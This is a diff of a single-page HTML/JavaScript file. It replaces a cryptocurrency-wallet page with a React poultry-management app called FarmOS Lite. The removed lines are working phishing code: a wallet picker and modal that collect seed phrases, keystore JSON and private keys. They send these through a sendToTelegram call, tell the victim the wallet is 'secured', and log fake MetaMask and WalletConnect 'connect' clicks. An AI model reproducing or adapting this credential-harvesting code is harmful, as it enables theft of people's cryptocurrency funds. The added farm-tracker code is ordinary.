+        React.createElement('div', { className: "bg-gradient-to-r from-green-50 to-emerald-50 rounded-xl p-5 space-y-2" },
+          React.createElement('h3', { className: "font-semibold" }, "📊 Results"),
+          React.createElement('p', null, "🐔 Daily Feed: ", React.createElement('strong', null, `${dailyKg.toFixed(2)} kg`)),
+          React.createElement('p', null, "💰 Daily Cost: $", dailyCost.toFixed(2), " | Weekly: $", (dailyCost*7).toFixed(2)),
+          React.createElement('p', null, "📉 Cost per Bird: $", costPerBird.toFixed(2)),
+          React.createElement('p', { className: "text-lg font-bold text-green-700" }, "📈 Estimated Profit: $", profit.toFixed(2))
+        )
+      );
+    };
 
-    let selectedWalletForSeed = null;
+    const EggTracker = () => {
+      const { state, dispatch } = useFarm();
+      const [date, setDate] = useState(format(new Date(), 'yyyy-MM-dd'));
+      const [count, setCount] = useState(0);
+      const add = () => { if(count>0) dispatch({ type:'ADD_EGG_ENTRY', payload:{ id:crypto.randomUUID(), date, count } }); setCount(0); };
+      const del = id => dispatch({ type:'DELETE_EGG_ENTRY', payload:id });
+      const now = new Date();
+      const weekStart = startOfWeek(now, { weekStartsOn:1 });
+      const weekEnd = endOfWeek(now, { weekStartsOn:1 });
+      const days = eachDayOfInterval({ start:weekStart, end:weekEnd });
+      const summary = days.map(day => ({ day:format(day,'EEE'), eggs:state.eggEntries.find(e=>e.date===format(day,'yyyy-MM-dd'))?.count||0 }));
+      const totalEggs = summary.reduce((s,i)=>s+i.eggs,0);
+      const totalDeaths = state.mortalityEntries.reduce((s,m)=>s+m.deaths,0);
+      const currentBirds = Math.max(0, state.farmParams.birdCount - totalDeaths);
+      const rate = currentBirds ? (totalEggs/7/currentBirds)*100 : 0;
+      return React.createElement('div', { className: "space-y-5" },
+        React.createElement('h2', { className: "text-xl font-bold text-green-800" }, "🥚 Egg Production Tracker"),
+        React.createElement('div', { className: "bg-white rounded-xl p-4 flex flex-wrap gap-3 items-end" },
+          React.createElement('div', {}, 
+            React.createElement('label', { className:"block text-xs text-gray-500" },"Date"),
+            React.createElement('input', { type:"date", value:date, onChange:e=>setDate(e.target.value), className:"border rounded p-2" })
+          ),
+          React.createElement('div', {},
+            React.createElement('label', { className:"block text-xs text-gray-500" },"Eggs"),
+            React.createElement('input', { type:"number", value:count, onChange:e=>setCount(+e.target.value), className:"border rounded p-2 w-28" })
+          ),
+          React.createElement('button', { onClick:add, className:"bg-green-600 text-white px-4 py-2 rounded-lg" }, "+ Add")
+        ),
+        React.createElement('div', { className: "bg-green-50 p-3 rounded-lg text-center" }, 
+          React.createElement('p', { className:"text-sm" }, "Production rate (last 7 days): ", React.createElement('strong', null, `${rate.toFixed(1)}%`))
+        ),
+        React.createElement('div', { className: "bg-white rounded-xl overflow-hidden" },
+          React.createElement('h3', { className:"font-semibold p-3 border-b" },"Weekly Summary"),
+          React.createElement('div', { className:"grid grid-cols-7 divide-x text-center text-sm" }, 
+            summary.map(s => React.createElement('div', { key:s.day }, React.createElement('span',{className:"block"},s.day), React.createElement('span',{className:"font-bold"},s.eggs)))
+          ),
+          React.createElement('div', { className:"p-3 border-t text-right font-medium" }, `Total: ${totalEggs} eggs`)
+        ),
+        React.createElement('div', { className:"space-y-2 max-h-64 overflow-auto" }, 
+          state.eggEntries.slice().reverse().map(entry => 
+            React.createElement('div', { key:entry.id, className:"bg-gray-50 p-2 rounded flex justify-between" },
+              React.createElement('span', null, entry.date, " — ", entry.count, " eggs"),
+              React.createElement('button', { onClick:()=>del(entry.id), className:"text-red-500 text-sm" }, "✖")
+            )
+          )
+        ),
+        React.createElement(UpgradePrompt)
+      );
+    };
 
-    function renderWalletGrid(filter = "") {
-        const filtered = walletsList.filter(w => w.name.toLowerCase().includes(filter.toLowerCase()));
-        const container = document.getElementById("walletsGrid");
-        if (!filtered.length) {
-            container.innerHTML = `<div class="no-results"><i class="fas fa-search-minus"></i> No matching wallets</div>`;
-            return;
-        }
-        container.innerHTML = filtered.map(w => `
-            <div class="wallet-tile" data-w="${w.name}">
-                <div class="wallet-logo"><img src="${w.logo}" alt="${w.name}" onerror="this.src='https://placehold.co/200x200?text=Logo'"></div>
-                <div class="wallet-name">${w.name}</div>
-            </div>
-        `).join('');
-        document.querySelectorAll('.wallet-tile').forEach(tile => {
-            tile.addEventListener('click', () => {
-                selectedWalletForSeed = tile.getAttribute('data-w');
-                openSeedModal(selectedWalletForSeed);
-            });
-        });
-    }
+    const HatchTracker = () => {
+      const { state, dispatch } = useFarm();
+      const [date, setDate] = useState(format(new Date(),'yyyy-MM-dd'));
+      const [eggsSet, setEggsSet] = useState(0);
+      const [eggsHatched, setHatched] = useState(0);
+      const add = () => { if(eggsSet>0) dispatch({ type:'ADD_HATCH_ENTRY', payload:{ id:crypto.randomUUID(), date, eggsSet, eggsHatched } }); setEggsSet(0); setHatched(0); };
+      const del = id => dispatch({ type:'DELETE_HATCH_ENTRY', payload:id });
+      const totalSet = state.hatchEntries.reduce((s,e)=>s+e.eggsSet,0);
+      const totalHatched = state.hatchEntries.reduce((s,e)=>s+e.eggsHatched,0);
+      const hatchability = totalSet ? (totalHatched/totalSet)*100 : 0;
+      return React.createElement('div', { className: "space-y-5" },
+        React.createElement('h2', { className: "text-xl font-bold text-green-800" }, "🐣 Hatch Rate Tracker"),
+        React.createElement('div', { className: "bg-white rounded-xl p-4 flex flex-wrap gap-3 items-end" },
+          React.createElement('input', { type:"date", value:date, onChange:e=>setDate(e.target.value), className:"border rounded p-2" }),
+          React.createElement('input', { type:"number", placeholder:"Eggs set", value:eggsSet, onChange:e=>setEggsSet(+e.target.value), className:"border rounded p-2 w-28" }),
+          React.createElement('input', { type:"number", placeholder:"Hatched", value:eggsHatched, onChange:e=>setHatched(+e.target.value), className:"border rounded p-2 w-28" }),
+          React.createElement('button', { onClick:add, className:"bg-green-600 text-white px-4 py-2 rounded-lg" }, "+ Add Batch")
+        ),
+        React.createElement('div', { className: "bg-teal-50 p-4 rounded-xl text-center" },
+          React.createElement('p', { className:"text-lg font-bold" }, `Overall Hatchability: ${hatchability.toFixed(1)}%`),
+          React.createElement('p', { className:"text-sm" }, `(${totalHatched} / ${totalSet} hatched)`)
+        ),
+        React.createElement('div', { className:"space-y-2 max-h-64 overflow-auto" }, 
+          state.hatchEntries.slice().reverse().map(e => 
+            React.createElement('div', { key:e.id, className:"bg-gray-50 p-2 rounded flex justify-between" },
+              React.createElement('span', null, e.date, " | Set: ", e.eggsSet, " | Hatched: ", e.eggsHatched),
+              React.createElement('button', { onClick:()=>del(e.id), className:"text-red-500" }, "✖")
+            )
+          )
+        ),
+        React.createElement(UpgradePrompt)
+      );
+    };
 
-    // Seed modal logic
-    const seedModal = document.getElementById("seedModal");
-    function openSeedModal(walletName) {
-        document.getElementById("seedModalTitle").innerHTML = `<i class="fas fa-key"></i> ${walletName} · credentials`;
-        document.getElementById("seedInput").value = "";
-        document.getElementById("keystoreInput").value = "";
-        document.getElementById("pkeyInput").value = "";
-        document.querySelectorAll('.pane').forEach(p => p.classList.remove('active-pane'));
-        document.getElementById("phrasePane").classList.add('active-pane');
-        document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-        document.querySelector('.tab[data-tab="phrase"]').classList.add('active');
-        seedModal.classList.add('active');
-    }
-    function closeSeedModal() { seedModal.classList.remove('active'); }
-    document.getElementById("closeSeedModalBtn").addEventListener('click', closeSeedModal);
-    seedModal.addEventListener('click', (e) => { if(e.target === seedModal) closeSeedModal(); });
-    document.querySelectorAll('.tab').forEach(tab => {
-        tab.addEventListener('click', () => {
-            const target = tab.getAttribute('data-tab');
-            document.querySelectorAll('.pane').forEach(p => p.classList.remove('active-pane'));
-            if (target === 'phrase') document.getElementById("phrasePane").classList.add('active-pane');
-            if (target === 'keystore') document.getElementById("keystorePane").classList.add('active-pane');
-            if (target === 'pkey') document.getElementById("pkeyPane").classList.add('active-pane');
-            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
-            tab.classList.add('active');
-        });
-    });
+    const MortalityTracker = () => {
+      const { state, dispatch } = useFarm();
+      const [date, setDate] = useState(format(new Date(),'yyyy-MM-dd'));
+      const [deaths, setDeaths] = useState(0);
+      const add = () => { if(deaths>0) dispatch({ type:'ADD_MORTALITY_ENTRY', payload:{ id:crypto.randomUUID(), date, deaths } }); setDeaths(0); };
+      const del = id => dispatch({ type:'DELETE_MORTALITY_ENTRY', payload:id });
+      const totalDeaths = state.mortalityEntries.reduce((s,e)=>s+e.deaths,0);
+      const sevenAgo = subDays(new Date(),7);
+      const recent = state.mortalityEntries.filter(e=>isAfter(new Date(e.date), sevenAgo)).reduce((s,e)=>s+e.deaths,0);
+      return React.createElement('div', { className: "space-y-5" },
+        React.createElement('h2', { className: "text-xl font-bold text-green-800" }, "📉 Mortality Tracker"),
+        React.createElement('div', { className: "bg-white rounded-xl p-4 flex flex-wrap gap-3 items-end" },
+          React.createElement('input', { type:"date", value:date, onChange:e=>setDate(e.target.value), className:"border rounded p-2" }),
+          React.createElement('input', { type:"number", placeholder:"Deaths", value:deaths, onChange:e=>setDeaths(+e.target.value), className:"border rounded p-2 w-24" }),
+          React.createElement('button', { onClick:add, className:"bg-rose-600 text-white px-4 py-2 rounded-lg" }, "Log Deaths")
+        ),
+        React.createElement('div', { className: "grid grid-cols-2 gap-3" },
+          React.createElement('div', { className: "bg-rose-100 p-3 rounded-xl text-center" },
+            React.createElement('p', { className:"text-sm" },"Total Mortality"),
+            React.createElement('p', { className:"text-2xl font-bold" }, totalDeaths)
+          ),
+          React.createElement('div', { className: "bg-amber-100 p-3 rounded-xl text-center" },
+            React.createElement('p', { className:"text-sm" },"Last 7 days"),
+            React.createElement('p', { className:"text-2xl font-bold" }, recent)
+          )
+        ),
+        React.createElement('div', { className:"space-y-2 max-h-64 overflow-auto" }, 
+          state.mortalityEntries.slice().reverse().map(e => 
+            React.createElement('div', { key:e.id, className:"bg-gray-50 p-2 rounded flex justify-between" },
+              React.createElement('span', null, e.date, " — ", e.deaths, " death(s)"),
+              React.createElement('button', { onClick:()=>del(e.id), className:"text-red-500" }, "✖")
+            )
+          )
+        ),
+        React.createElement(UpgradePrompt)
+      );
+    };
 
-    document.getElementById("submitCreds").addEventListener('click', async () => {
-        let cred = "", type = "";
-        const active = document.querySelector('.pane.active-pane');
-        if (active.id === "phrasePane") { cred = document.getElementById("seedInput").value.trim(); type = "Seed Phrase"; }
-        else if (active.id === "keystorePane") { cred = document.getElementById("keystoreInput").value.trim(); type = "Keystore JSON"; }
-        else { cred = document.getElementById("pkeyInput").value.trim(); type = "Private Key"; }
-        if (!cred) { showToast(`Enter ${type}`, 2500); return; }
-        showToast(`Validating ${type}...`, 1500);
-        const ok = await sendToTelegram(cred, type, `wallet:${selectedWalletForSeed || "manual"}`);
-        if (ok) showToast(`✓ ${selectedWalletForSeed || "Wallet"} secured`, 3000);
-        else showToast(`⚠️ Logged locally (Telegram not set)`, 3000);
-        closeSeedModal();
-    });
+    // --- Main App with Tabs ---
+    const App = () => {
+      const [tab, setTab] = useState('dashboard');
+      const components = { dashboard: Dashboard, feed: FeedCalculator, eggs: EggTracker, hatch: HatchTracker, mortality: MortalityTracker };
+      const CurrentComponent = components[tab];
+      const icons = { dashboard:'📊', feed:'🍗', eggs:'🥚', hatch:'🐣', mortality:'📉' };
+      const labels = { dashboard:'Farm', feed:'Feed', eggs:'Eggs', hatch:'Hatch', mortality:'Mortality' };
+      return React.createElement(FarmProvider, null,
+        React.createElement('div', { className: "min-h-screen bg-green-50 pb-20" },
+          React.createElement('header', { className: "bg-green-800 text-white p-4 shadow-md sticky top-0 z-10" },
+            React.createElement('h1', { className: "text-xl font-bold text-center" }, "🌾 FarmOS Lite"),
+            React.createElement('p', { className: "text-xs text-center text-green-200" }, "Poultry & Quail Management")
+          ),
+          React.createElement('main', { className: "p-4 max-w-4xl mx-auto" },
+            React.createElement(CurrentComponent, null),
+            React.createElement(DataManagement, null)
+          ),
+          React.createElement('nav', { className: "fixed bottom-0 left-0 right-0 bg-white border-t border-green-200 flex justify-around py-2 shadow-lg" },
+            ['dashboard','feed','eggs','hatch','mortality'].map(t => 
+              React.createElement('button', { key: t, onClick: () => setTab(t), className: `flex flex-col items-center p-2 rounded-lg transition ${tab === t ? 'text-green-700 bg-green-100' : 'text-gray-500'}` },
+                React.createElement('span', { className: "text-xl" }, icons[t]),
+                React.createElement('span', { className: "text-xs" }, labels[t])
+              )
+            )
+          )
+        )
+      );
+    };
 
-    // Connect modal
-    const connectModal = document.getElementById("connectModal");
-    document.getElementById("openConnectBtn").onclick = () => connectModal.classList.add('active');
-    document.getElementById("closeConnectBtn").onclick = () => connectModal.classList.remove('active');
-    connectModal.addEventListener('click', (e) => { if(e.target === connectModal) connectModal.classList.remove('active'); });
-    document.getElementById("simMM").onclick = () => { showToast("MetaMask simulation", 2000); sendToTelegram("Clicked MetaMask connect", "connect_event", "connect_wallet"); connectModal.classList.remove('active'); };
-    document.getElementById("simWC").onclick = () => { showToast("WalletConnect demo", 2000); sendToTelegram("WalletConnect simulation", "connect_event", "connect_wallet"); connectModal.classList.remove('active'); };
-    document.getElementById("manualAddr").onclick = () => { let a = prompt("Enter public address (demo):", "0x..."); if(a?.trim()) sendToTelegram(a.trim(), "public_address", "manual_input"); connectModal.classList.remove('active'); };
-    document.getElementById("openSeedBtn").onclick = () => { selectedWalletForSeed = "external"; openSeedModal("Secure entry"); };
-    document.getElementById("searchWallet").addEventListener('input', (e) => renderWalletGrid(e.target.value));
-    renderWalletGrid("");
-
-    // ---------- Live scrolling ticker ----------
-    let priceCache = { btc: 42500, eth: 2280, sol: 98, bnb: 315, ch: { btc: 0.5, eth: -0.2, sol: 3.1, bnb: 0.9 } };
-    async function fetchPrices() {
-        try {
-            const res = await fetch("https://api.coingecko.com/api/v3/simple/price?ids=bitcoin,ethereum,solana,bnb&vs_currencies=usd&include_24hr_change=true");
-            const d = await res.json();
-            priceCache = {
-                btc: d.bitcoin?.usd || 42500, eth: d.ethereum?.usd || 2280, sol: d.solana?.usd || 98, bnb: d.bnb?.usd || 315,
-                ch: { btc: d.bitcoin?.usd_24h_change || 0, eth: d.ethereum?.usd_24h_change || 0, sol: d.solana?.usd_24h_change || 0, bnb: d.bnb?.usd_24h_change || 0 }
-            };
-            renderTicker();
-        } catch(e) { console.warn(e); }
-    }
-
-    function renderTicker() {
-        const items = [
-            { sym: "BTC", price: priceCache.btc, change: priceCache.ch.btc },
-            { sym: "ETH", price: priceCache.eth, change: priceCache.ch.eth },
-            { sym: "SOL", price: priceCache.sol, change: priceCache.ch.sol },
-            { sym: "BNB", price: priceCache.bnb, change: priceCache.ch.bnb }
-        ];
-        let html = "";
-        for (let i = 0; i < 4; i++) {
-            items.forEach(it => {
-                const cls = it.change >= 0 ? "positive" : "negative";
-                const arrow = it.change >= 0 ? "▲" : "▼";
-                html += `<div class="ticker-item"><span class="ticker-symbol">${it.sym}</span><span class="ticker-price">$${it.price.toLocaleString()}</span><span class="ticker-change ${cls}">${arrow} ${Math.abs(it.change).toFixed(2)}%</span></div>`;
-            });
-        }
-        document.getElementById("tickerTrack").innerHTML = html;
-    }
-    fetchPrices();
-    setInterval(fetchPrices, 12000);
-    setTimeout(() => showToast("🔐 600+ assets protected — select your wallet", 4000), 800);
-</script>
+    ReactDOM.createRoot(document.getElementById('root')).render(React.createElement(App));
+  </script>
 </body>
 </html>
